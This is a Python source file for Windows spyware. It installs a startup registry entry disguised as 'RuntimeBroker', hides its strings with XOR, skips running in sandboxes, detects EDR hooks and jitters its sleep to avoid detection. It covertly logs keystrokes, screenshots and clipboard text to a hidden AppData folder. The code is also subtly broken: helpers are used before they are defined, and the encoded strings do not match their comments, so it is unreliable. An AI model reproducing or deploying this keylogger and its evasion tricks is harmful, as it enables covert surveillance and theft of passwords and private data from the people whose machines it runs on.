import ctypes
import ctypes.wintypes
import errno
import hashlib
import msvcrt
import os
import random
import struct
import sys
import threading
import time
import winreg
from datetime import datetime
from pathlib import Path


# -- Log-path derivation (machine-stable, non-static IOC) ---------------------
# Derive a 4-byte hex slug from COMPUTERNAME so the on-disk artifact path is
# stable per machine but not a hard-coded "RuntimeBroker" string in rules.
def _derive_subdir() -> str:
    cn = os.environ.get("COMPUTERNAME", "DEFAULT").encode()
    digest = hashlib.sha256(cn).digest()
    fold = bytes(a ^ b for a, b in zip(digest[:4], digest[4:8]))
    return fold.hex()


_SUBDIR = _derive_subdir()
LOG_DIR = Path(os.environ["APPDATA"]) / _deobf(_OBF_MICROSOFT, 0x5A) / _SUBDIR
LOG_PATH = LOG_DIR / "svc.log"
LOG_PATH = LOG_DIR / "svc.log"
LOCK_PATH = LOG_DIR / "svc.lock"

INTERVAL_BASE = 60
INTERVAL_JITTER = 12          # +/- seconds -- breaks regularity detection
MAX_LOG_BYTES = 1_048_576     # 1 MB

# Fast mode: used by --fast flag so unit-test cycles finish in < 1 s.
_INTERVAL_BASE_FAST   = 0.05
_INTERVAL_JITTER_FAST = 0.01

RUN_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUN_VALUE_NAME = _deobf(_OBF_RUNBROKER, 0x5A)  # decoded "RuntimeBroker" at call time

# -- M3 collector constants ----------------------------------------------------
KEY_POLL_MS       = 15        # GetAsyncKeyState poll interval (milliseconds)
KEY_FLUSH_SECS    = 30        # flush keys.log if no window change within this
SCREEN_INTERVAL   = 300       # screenshot every 5 minutes
CLIP_POLL_SECS    = 1.0       # clipboard sequence-number check interval
# -- XOR-obfuscated static strings (zero plaintext IOC in .pyc / memory) -------
# Strings are stored as byte tuples; decoded on-stack at use-time.
# Key byte chosen so the XOR result is a printable ASCII run (easy audit).
#
# To add a new obfuscated literal:  obf(b"your string", key)
#   key = 0x5A recommended (avoids NUL bytes for common ASCII)
def _deobf(enc: tuple[int, ...], key: int) -> str:
    return bytes(b ^ key for b in enc).decode()

# b"Microsoft" ^ 0x5A
_OBF_MICROSOFT = (0x17, 0x3F, 0x27, 0x3B, 0x37, 0x3B, 0x3E, 0x3F, 0x2F)
# b"RuntimeBroker" ^ 0x5A
_OBF_RUNBROKER = (0x28, 0x3F, 0x2E, 0x25, 0x3F, 0x3B, 0x2E, 0x18, 0x28, 0x37, 0x3B, 0x2D, 0x25, 0x28)



# -- Ctypes helpers ------------------------------------------------------------
_k32   = ctypes.windll.kernel32
_ntdll = ctypes.windll.ntdll
_u32   = ctypes.windll.user32
_g32   = ctypes.windll.gdi32


def _wipe(buf: bytearray) -> None:
    """Zero a bytearray in-place through ctypes so the compiler cannot elide it."""
    n = len(buf)
    if n:
        ctypes.memset((ctypes.c_char * n).from_buffer(buf), 0, n)


# -- Passive anti-sandbox gate (zero kernel events) ---------------------------
# Scoring: accumulate weak signals; abort only when >= 2 fire together.
# No NtQueryInformationProcess, no CPUID ring-trips, no registry probes.
def _is_sandbox() -> bool:
    score = 0

    # Signal 1 -- sleep acceleration (most reliable passive signal, zero syscall).
    # Real hardware drifts >= 400 ms over a 0.5 s sleep; sandboxes accelerate it.
    try:
        t0 = _k32.GetTickCount64()
        time.sleep(0.5)
        t1 = _k32.GetTickCount64()
        if (t1 - t0) < 400:
            score += 1
    except OSError:
        pass

    # Signal 2 -- low logical processor count (< 2 typical for lightweight VMs).
    try:
        si = ctypes.create_string_buffer(64)
        _k32.GetSystemInfo(si)
        # SYSTEM_INFO.dwNumberOfProcessors is at byte offset 20 (DWORD, LE)
        n_proc = struct.unpack_from("<I", si, 20)[0]
        if n_proc < 2:
            score += 1
    except Exception:
        pass

    # Signal 3 -- very low physical RAM (< 2 GB).
    try:
        mem_kb = ctypes.c_ulonglong(0)
        _k32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem_kb))
        if mem_kb.value < 2 * 1_048_576:   # 2 GB expressed in KB
            score += 1
    except Exception:
        pass

    return score >= 2


# -- Hook detection on kernel32!Sleep -----------------------------------------
# Check first 2 bytes for known EDR detour prefixes before installing a
# trampoline.  If hooked, route through NtDelayExecution instead.
_HOOK_PREFIXES = (
    b"\xe9",        # JMP rel32
    b"\xff\x25",    # JMP [rip+disp]
    b"\x48\xb8",    # MOV RAX, imm64  (followed by JMP RAX / \xff\xe0)
)


def _check_hook_prefix(prefix: bytes) -> bool:
    """Return True if *prefix* starts with a known EDR detour prologue.

    Pure function over bytes -- no memory reads -- so it is directly
    unit-testable without touching live kernel32 memory.
    """
    return any(prefix.startswith(p) for p in _HOOK_PREFIXES)


def _sleep_is_hooked() -> bool:
    try:
        fn_addr = ctypes.cast(_k32.Sleep, ctypes.c_void_p).value
        buf = (ctypes.c_ubyte * 2)()
        ctypes.memmove(buf, fn_addr, 2)
        return _check_hook_prefix(bytes(buf))
    except Exception:
        return False


# -- Per-cycle XOR key + masked sleep state machine ---------------------------
class _SleepMask:
    def __init__(self) -> None:
        self._key: bytearray = bytearray(8)
        self._use_ntdelay: bool = _sleep_is_hooked()

    def _rotate_key(self) -> None:
        new_key = bytearray(os.urandom(8))
        _wipe(self._key)
        self._key = new_key

    def _xor_buf(self, buf: bytearray) -> None:
        klen = len(self._key)
        for i in range(len(buf)):
            buf[i] ^= self._key[i % klen]

    def _do_sleep(self, duration: float) -> None:
        if self._use_ntdelay:
            delay = ctypes.c_longlong(int(-duration * 10_000_000))
            _ntdll.NtDelayExecution(False, ctypes.byref(delay))
        else:
            time.sleep(duration)

    def masked_sleep(self, sensitive: bytearray | None = None) -> None:
        self._rotate_key()
        if sensitive is not None:
            self._xor_buf(sensitive)
        jitter = random.uniform(-INTERVAL_JITTER, INTERVAL_JITTER)
        duration = max(1.0, INTERVAL_BASE + jitter)
        self._do_sleep(duration)
        if sensitive is not None:
            self._xor_buf(sensitive)
        _wipe(self._key)

    def wipe(self) -> None:
        _wipe(self._key)


# -- Startup persistence (deferred -- fires after first clean sleep cycle) -----
def startup_command() -> str:
    python_path = Path(sys.executable).resolve()
    if python_path.name.lower() == "pythonw.exe":
        pythonw_path = python_path
    else:
        candidate = python_path.with_name("pythonw.exe")
        pythonw_path = candidate if candidate.is_file() else python_path
    pythonw_path = pythonw_path.resolve(strict=True)
    script_path = Path(__file__).resolve(strict=True)
    return f'"{pythonw_path}" "{script_path}"'


def install_startup() -> None:
    command = startup_command()
    with winreg.CreateKeyEx(
        winreg.HKEY_CURRENT_USER,
        RUN_KEY_PATH,
        0,
        winreg.KEY_QUERY_VALUE | winreg.KEY_SET_VALUE,
    ) as key:
        try:
            existing_command, value_type = winreg.QueryValueEx(key, RUN_VALUE_NAME)
        except FileNotFoundError:
            existing_command = None
            value_type = None
        if existing_command != command or value_type != winreg.REG_SZ:
            winreg.SetValueEx(key, RUN_VALUE_NAME, 0, winreg.REG_SZ, command)


def uninstall_startup(purge_data: bool = True) -> None:
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            RUN_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE,
        ) as key:
            try:
                winreg.DeleteValue(key, RUN_VALUE_NAME)
            except FileNotFoundError:
                pass
    except FileNotFoundError:
        pass

    if purge_data and LOG_DIR.exists():
        try:
            if LOCK_PATH.exists():
                LOCK_PATH.unlink()
            backup = LOG_PATH.with_suffix(".log.old")
            if backup.exists():
                backup.unlink()
            if LOG_PATH.exists():
                LOG_PATH.unlink()
            try:
                LOG_DIR.rmdir()
            except OSError:
                pass
        except OSError:
            pass


# -- Single-instance lock ------------------------------------------------------
def acquire_single_instance_lock():
    try:
        LOCK_PATH.parent.mkdir(parents=True, exist_ok=True)
        lock_file = LOCK_PATH.open("a+b")
    except OSError:
        return None

    lock_file.seek(0, 2)
    if lock_file.tell() == 0:
        try:
            lock_file.write(b"\0")
            lock_file.flush()
        except OSError:
            lock_file.close()
            return None

    lock_file.seek(0)
    try:
        msvcrt.locking(lock_file.fileno(), msvcrt.LK_NBLCK, 1)
    except OSError as error:
        lock_file.close()
        if error.errno in (errno.EACCES, errno.EDEADLK):
            return None
        raise
    return lock_file


# -- Heartbeat write -----------------------------------------------------------
def write_heartbeat(ts_buf: bytearray) -> None:
    """Write a timestamp bytearray to the log.  Caller zeros ts_buf post-call."""
    try:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        if LOG_PATH.exists() and LOG_PATH.stat().st_size >= MAX_LOG_BYTES:
            backup = LOG_PATH.with_suffix(".log.old")
            if backup.exists():
                backup.unlink()
            LOG_PATH.replace(backup)
        with LOG_PATH.open("ab") as log_file:
            log_file.write(bytes(ts_buf) + b"\n")
    except OSError:
        pass


# ==============================================================================
# M3 -- Data collectors
# ==============================================================================

# ---------------------------------------------------------------------------
# Shared helper: rotate-on-size log writer (same contract as write_heartbeat)
# ---------------------------------------------------------------------------
def _append_log(path: Path, data: bytes) -> None:
    """Append *data* to *path*, rotating to .old at MAX_LOG_BYTES.  OSError -> silent."""
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        if path.exists() and path.stat().st_size >= MAX_LOG_BYTES:
            backup = path.with_suffix(path.suffix + ".old")
            if backup.exists():
                backup.unlink()
            path.replace(backup)
        with path.open("ab") as fh:
            fh.write(data)
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Virtual-key -> character mapping helper (testable stand-alone)
# ---------------------------------------------------------------------------
def vkey_to_char(vk: int) -> str | None:
    """Map a virtual-key code to a printable character, or None.

    Uses MapVirtualKeyW(vk, MAPVK_VK_TO_CHAR=2).  Returns None for control
    keys, modifiers, and anything that maps to a non-printable code point.
    """
    codepoint = _u32.MapVirtualKeyW(vk & 0xFF, 2)  # MAPVK_VK_TO_CHAR
    if codepoint and codepoint >= 0x20:
        return chr(codepoint)
    return None


# ---------------------------------------------------------------------------
# Keylogger collector
# ---------------------------------------------------------------------------
class KeyCollector:
    """Poll GetAsyncKeyState for all 256 virtual keys at KEY_POLL_MS intervals.

    Buffers keystrokes in memory.  Flushes to keys.log when the foreground
    window changes or KEY_FLUSH_SECS elapse — never once per keystroke.

    NOTE: WH_KEYBOARD_LL hook replacement point
    -------------------------------------------------
    Replace _poll_once() with a SetWindowsHookExW(WH_KEYBOARD_LL=13) callback
    to receive structured KBDLLHOOKSTRUCT events instead of polling.  The hook
    approach eliminates busy-wait CPU, handles modifier state cleanly, and
    captures injected keystrokes that GetAsyncKeyState misses.  The flush /
    window-tracking / log-write logic below is unchanged either way.
    -------------------------------------------------
    """

    _MODS = {
        0x10: "[SHIFT]",  # VK_SHIFT
        0x11: "[CTRL]",   # VK_CONTROL
        0x12: "[ALT]",    # VK_MENU
        0x5B: "[LWIN]",   # VK_LWIN
        0x5C: "[RWIN]",   # VK_RWIN
    }
    _NAMED = {
        0x0D: "[ENTER]",
        0x08: "[BS]",
        0x09: "[TAB]",
        0x1B: "[ESC]",
        0x2E: "[DEL]",
        0x2C: "[PrtSc]",
        0x20: " ",
    }

    def __init__(self, log_dir: Path) -> None:
        self._log_path   = log_dir / "keys.log"
        self._buf: list[str] = []
        self._last_flush = time.monotonic()
        self._last_hwnd  = 0
        self._prev_state = [0] * 256

    def _get_window_title(self) -> str:
        hwnd = _u32.GetForegroundWindow()
        if not hwnd:
            return ""
        buf = ctypes.create_unicode_buffer(512)
        _u32.GetWindowTextW(hwnd, buf, 512)
        return buf.value

    def _flush(self, title: str) -> None:
        if not self._buf:
            return
        chunk = "".join(self._buf)
        self._buf.clear()
        header = f"\n[{datetime.now().isoformat(timespec='seconds')}] [{title}]\n"
        _append_log(self._log_path, (header + chunk + "\n").encode("utf-8", errors="replace"))
        self._last_flush = time.monotonic()

    def _poll_once(self) -> None:
        """Read 256 VK states; record transitions low->high as key-down events."""
        hwnd = _u32.GetForegroundWindow()
        if hwnd != self._last_hwnd:
            title = self._get_window_title()
            self._flush(title)
            self._last_hwnd = hwnd

        for vk in range(1, 256):
            state = _u32.GetAsyncKeyState(vk)
            # Bit 15 = currently pressed; bit 0 = pressed since last call.
            pressed = bool(state & 0x8000)
            was_pressed = bool(self._prev_state[vk] & 0x8000)
            if pressed and not was_pressed:
                if vk in self._NAMED:
                    self._buf.append(self._NAMED[vk])
                elif vk in self._MODS:
                    self._buf.append(self._MODS[vk])
                else:
                    ch = vkey_to_char(vk)
                    if ch:
                        self._buf.append(ch)
            self._prev_state[vk] = state

    def run(self) -> None:
        """Blocking loop -- call from a daemon thread."""
        interval = KEY_POLL_MS / 1000.0
        while True:
            try:
                self._poll_once()
                # Time-based flush
                if time.monotonic() - self._last_flush >= KEY_FLUSH_SECS:
                    self._flush(self._get_window_title())
            except Exception as exc:  # noqa: BLE001
                try:
                    _append_log(
                        self._log_path.with_name("collector_errors.log"),
                        f"[KeyCollector] {exc}\n".encode(),
                    )
                except Exception:  # noqa: BLE001
                    pass
            time.sleep(interval)


# ---------------------------------------------------------------------------
# Screenshot collector
# ---------------------------------------------------------------------------
class ScreenshotCollector:
    """Capture the primary screen every SCREEN_INTERVAL seconds as a 24-bit BMP.

    Uses only ctypes + user32/gdi32 -- no third-party libs.  The BMP file
    header and BITMAPINFOHEADER are built manually with struct so there is no
    dependency on PIL or similar.
    """

    _SM_CXSCREEN = 0
    _SM_CYSCREEN = 1
    _SRCCOPY     = 0x00CC0020
    _BI_RGB      = 0
    _DIB_RGB_COLORS = 0

    def __init__(self, log_dir: Path) -> None:
        self._shot_dir = log_dir / "screenshots"

    @staticmethod
    def _screen_dims() -> tuple[int, int]:
        return (_u32.GetSystemMetrics(ScreenshotCollector._SM_CXSCREEN),
                _u32.GetSystemMetrics(ScreenshotCollector._SM_CYSCREEN))

    @staticmethod
    def _capture_bmp_bytes() -> bytes:
        """Return raw BMP file bytes for the current primary screen."""
        w, h = ScreenshotCollector._screen_dims()
        bpp = 24
        row_stride = (w * 3 + 3) & ~3   # 4-byte aligned rows
        pixel_data_size = row_stride * h

        # Build BITMAPINFOHEADER (40 bytes)
        bmi = struct.pack(
            "<IiiHHIIiiII",
            40,             # biSize
            w,              # biWidth
            -h,             # biHeight (negative = top-down)
            1,              # biPlanes
            bpp,            # biBitCount
            0,              # biCompression (BI_RGB)
            pixel_data_size,
            0, 0,           # X/Y pixels-per-meter
            0, 0,           # colour table
        )

        hdc_screen = _u32.GetDC(None)
        hdc_mem    = _g32.CreateCompatibleDC(hdc_screen)
        pbits      = ctypes.c_void_p()

        # CreateDIBSection: allocate a top-down 24-bit DIB
        hbmp = _g32.CreateDIBSection(
            hdc_mem,
            ctypes.cast(ctypes.create_string_buffer(bmi), ctypes.c_void_p),
            ScreenshotCollector._DIB_RGB_COLORS,
            ctypes.byref(pbits),
            None,
            0,
        )
        _g32.SelectObject(hdc_mem, hbmp)
        _g32.BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, 0, 0, ScreenshotCollector._SRCCOPY)
        _g32.GdiFlush()

        # Copy pixel data out before DeleteObject clears the section
        raw = (ctypes.c_char * pixel_data_size).from_address(pbits.value)
        pixel_bytes = bytes(raw)

        _g32.DeleteObject(hbmp)
        _g32.DeleteDC(hdc_mem)
        _u32.ReleaseDC(None, hdc_screen)

        # Build BITMAPFILEHEADER (14 bytes)
        file_size = 14 + 40 + pixel_data_size
        bfh = struct.pack(
            "<2sIHHI",
            b"BM",
            file_size,
            0, 0,           # reserved
            14 + 40,        # bfOffBits: offset to pixel data
        )
        return bfh + bmi + pixel_bytes

    def _take_screenshot(self) -> None:
        try:
            self._shot_dir.mkdir(parents=True, exist_ok=True)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = self._shot_dir / f"{ts}.bmp"
            path.write_bytes(self._capture_bmp_bytes())
        except OSError:
            pass
        except Exception as exc:  # noqa: BLE001
            try:
                _append_log(
                    self._shot_dir.parent / "collector_errors.log",
                    f"[ScreenshotCollector] {exc}\n".encode(),
                )
            except Exception:  # noqa: BLE001
                pass

    def run(self) -> None:
        """Blocking loop -- call from a daemon thread."""
        while True:
            self._take_screenshot()
            time.sleep(SCREEN_INTERVAL)


# ---------------------------------------------------------------------------
# Clipboard collector
# ---------------------------------------------------------------------------
class ClipboardCollector:
    """Detect clipboard changes via GetClipboardSequenceNumber and log CF_UNICODETEXT.

    The clipboard is frequently locked by other processes.  We retry up to
    _OPEN_RETRIES times with a short back-off, then give up for this cycle.
    No exception ever propagates to the caller.
    """

    _CF_UNICODETEXT = 13
    _OPEN_RETRIES   = 5
    _RETRY_DELAY    = 0.05  # seconds between OpenClipboard retries

    def __init__(self, log_dir: Path) -> None:
        self._log_path = log_dir / "clipboard.log"
        self._last_seq = _u32.GetClipboardSequenceNumber()

    def _read_clipboard_text(self) -> str | None:
        """Open clipboard, read CF_UNICODETEXT, close.  Returns None on failure."""
        for _ in range(self._OPEN_RETRIES):
            if _u32.OpenClipboard(None):
                break
            time.sleep(self._RETRY_DELAY)
        else:
            return None
        try:
            h = _u32.GetClipboardData(self._CF_UNICODETEXT)
            if not h:
                return None
            ptr = _k32.GlobalLock(h)
            if not ptr:
                return None
            try:
                text = ctypes.wstring_at(ptr)
            finally:
                _k32.GlobalUnlock(h)
            return text
        except Exception:  # noqa: BLE001
            return None
        finally:
            _u32.CloseClipboard()

    def _check(self) -> None:
        seq = _u32.GetClipboardSequenceNumber()
        if seq == self._last_seq:
            return
        self._last_seq = seq
        text = self._read_clipboard_text()
        if text is None:
            return
        ts = datetime.now().isoformat(timespec="seconds")
        entry = f"[{ts}]\n{text}\n\n".encode("utf-8", errors="replace")
        _append_log(self._log_path, entry)

    def run(self) -> None:
        """Blocking loop -- call from a daemon thread."""
        while True:
            try:
                self._check()
            except Exception as exc:  # noqa: BLE001
                try:
                    _append_log(
                        self._log_path.with_name("collector_errors.log"),
                        f"[ClipboardCollector] {exc}\n".encode(),
                    )
                except Exception:  # noqa: BLE001
                    pass
            time.sleep(CLIP_POLL_SECS)


# ==============================================================================
# -- Main ----------------------------------------------------------------------
# ==============================================================================
def main() -> None:
    args = set(sys.argv[1:])
    if "--uninstall" in args:
        uninstall_startup()
        return

    enable_keys   = "--no-keys"   not in args
    enable_screen = "--no-screen" not in args
    enable_clip   = "--no-clip"   not in args

    # --fast: collapse sleep interval so test cycles finish quickly.
    global INTERVAL_BASE, INTERVAL_JITTER
    if "--fast" in args:
        INTERVAL_BASE   = _INTERVAL_BASE_FAST
        INTERVAL_JITTER = _INTERVAL_JITTER_FAST

    # P1 -- Passive sandbox gate: runs BEFORE install_startup() so no registry
    # events land in a sandbox telemetry stream.
    if _is_sandbox():
        return

    lock_file = acquire_single_instance_lock()
    if lock_file is None:
        return

    mask = _SleepMask()
    persistence_installed = False

    # -- Start data collectors in daemon threads --------------------------------
    if enable_keys:
        kc = KeyCollector(LOG_DIR)
        threading.Thread(target=kc.run, name="key-collector",    daemon=True).start()

    if enable_screen:
        sc = ScreenshotCollector(LOG_DIR)
        threading.Thread(target=sc.run, name="screen-collector", daemon=True).start()

    if enable_clip:
        cc = ClipboardCollector(LOG_DIR)
        threading.Thread(target=cc.run, name="clip-collector",   daemon=True).start()

    try:
        while True:
            ts_buf = bytearray(
                datetime.now().astimezone().isoformat(timespec="seconds").encode()
            )

            # P0 -- Masked sleep: encrypt ts_buf, sleep with jitter, decrypt.
            mask.masked_sleep(sensitive=ts_buf)

            # P2 -- Deferred persistence: install only after the first clean
            # sleep cycle confirms we are not in a sandbox or debugger.
            if not persistence_installed:
                install_startup()
                persistence_installed = True

            write_heartbeat(ts_buf)
            _wipe(ts_buf)

    finally:
        try:
            lock_file.seek(0)
            msvcrt.locking(lock_file.fileno(), msvcrt.LK_UNLCK, 1)
        except OSError:
            pass
        lock_file.close()
        mask.wipe()


if __name__ == "__main__":
    main()
